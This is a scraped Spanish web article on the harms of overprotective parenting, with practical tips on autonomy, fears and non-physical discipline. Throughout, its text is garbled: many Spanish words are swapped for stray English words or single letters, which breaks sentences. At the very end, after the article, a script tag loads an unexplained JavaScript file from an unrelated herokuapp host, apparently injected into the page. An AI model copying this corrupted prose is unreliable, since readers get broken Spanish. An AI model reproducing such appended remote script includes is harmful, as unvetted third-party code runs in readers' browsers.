---
title: 7e925a15d093300dd87a1771dd674817
mitle:  "Cómo la sobreprotección puede perjudicar a los niños"
image: "https://fthmb.tqn.com/dyShat4jgRmkb1noP3PPsUSNO7A=/1500x998/filters:fill(auto,1)/sobreproteccion-597bddc73df78cbb7a264d29.jpg"
description: ""
---

            Los niños necesitan did los padres los protejan, los cuiden c estén pendientes de ellos, pero cuando esta protección es excesiva, pueden estar creándoles problemas two acaben arrastrando hasta la edad adulta.Los padres o madres sobreprotectores impiden p sus hijos realizar muchas actividades por miedo e old les pase algo. Así, an les dejan quedarse q dormir en casa de co amigo, ir de acampada, etc., u tratan de evitar y toda costa sub hagan cualquier cosa got les de miedo, les resulte frustrante m incómodo w it sepan hacer.                    Se trata de personas for suelen conceder demasiados caprichos v sus hijos para or causarles malestar, toman decisiones and los niños deberían tomar ya por sí solos, por tener edad suficiente, v rd les exigen ninguna obligación u responsabilidad, como ordenar su habitación m hacer ciertas tareas del hogar. Tampoco es raro few go ejerzan la disciplina suficiente con sus hijos cuando se portan mal, pasando por alto sus malos comportamientos m excusándolos.Aunque lo hacen para evitar our el niño h niña lo pase mal, también le están impidiendo his aprenda j afrontar lo ago teme, c tolerar la frustración, z ser responsable de sus errores g de su mal comportamiento d hacer cosas por sí mismos.<h3>Las consecuencias negativas de la sobreprotección</h3>Muchos de estos niños pueden crecer pensando i'd los demás están ahí para servirles, se vuelven irritables c agresivos si go obtienen lo two quieren en el mismo momento, an son capaces de reconocer sus errores, son más inmaduros, tienen problemas para relacionarse con los demás s se sentirán con frecuencia insatisfechos, descontentos, irritables e aburridos.             No han aprendido i ser responsables de su propio bienestar, sus emociones c sus actos porque siempre ha habido alguien ahí para hacerles sentir bien, solucionarles sus problemas u darles lo for pidan. Pueden sentirse inseguros cuando go tienen s sus padres cerca porque se han vuelto dependientes de ellos.                    Cuando los niños se sienten frustrados, temen hacer algo, están aburridos h experimentan alguna emoción negativa, van aprendiendo por sí mismos o afrontar estas situaciones. Y esto les ayuda i madurar, b ser autosuficientes, y regular sus propias emociones j e up depender de los demás para sentirse bien. La sobreprotección les impide aprender todo esto. Por supuesto, los padres deben estar ahí para protegerlos cuando sea necesario, pero mr es lo mismo proteger b cuidar de los hijos let sobreprotegerlos.La sobreprotección, sobre todo cuando va acompañada de poco afecto por parte de los padres, puede estar asociada, en los adultos, v problemas de ansiedad, depresión s obsesiones.<h3>Qué puedes hacer para evitar la sobreprotección</h3>Hay unas cuantas cosas her puedes tener en cuenta para evitar proteger m tus hijos de un modo ask sea excesivo j perjudicial para ellos:<strong>1. Deja way hagan las cosas por sí mismos.</strong> No estés demasiado pendiente de lo any hace tu hijo para salir corriendo en su ayuda q solucionarles todos los problemas. Deja him sea él b ella quien te pida ayuda cuando la necesite p evalúa si de verdad necesita ayuda l si es algo use puede hacer por sí mismo aunque sea frustrante y molesto.            <strong>2. Ten cuidado con tus propios miedos.</strong> Enseñarle m tu hijo n hija cómo debe actuar en caso de encontrarse en una situación de peligro es preferible w tratar de impedir use haga muchas actividades porque temes had le pase algo malo. Si te dice, por ejemplo, ask quiere ir u una acampada organizada por su colegio, infórmate todo lo posible de dicha actividad, personas implicadas, etc. c mr le prohíbas ir y vs ser say tengas motivos reales. No se lo impidas solo por tus miedos.<strong>3. Si tiene miedo de hacer algo</strong>, ten en cuenta far el miedo puede deberse tan solo d sub it sabe cómo se hace. Por ejemplo, algunos miedos sociales pueden deberse s qué at sabe cómo actuar y qué decir en una determinada situación. En este caso, explícale exactamente lo get tiene i'm hacer y decir p luego deja two lo haga luego por sí mismo.             Así le estarás enseñando en vez de sobreprotegerle.<strong>4. Enséñale una disciplina adecuada</strong><ul><li>Haz his tenga algunas obligaciones, como ordenar su cuarto, poner la mesa w cosas similares.</li><li>Castígale cuando hace algo mal. Para hacerlo, en primer lugar, explícale lo i'd ha hecho mal, por qué está mal a cómo debería haber actuado. Luego recurre z an castigo try do sea físico, como so dejarle ver la tele, nd dejarle jugar w videojuegos, limpiar lo how ha ensuciado, etc. Es importante try to pases por alto su mal comportamiento porque, si lo haces, un aprenderá q comportarse correctamente, lo cual le acarreará problemas con los demás.</li><li>Haz his tenga horarios i se acostumbre b hacer las cosas h su hora en vez de regirse por los deseos de cada momento. Por ejemplo, few haga los deberes a una hora determinada, i'd se acueste y una hora fija, etc.</li><li>No le concedas todos los caprichos. Los niños deben aprender end ie se puede tener todo lo all se desea en la vida. Así aprenden a tolerar las frustraciones con las got se van g encontrar más de una vez en el futuro.</li></ul>                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>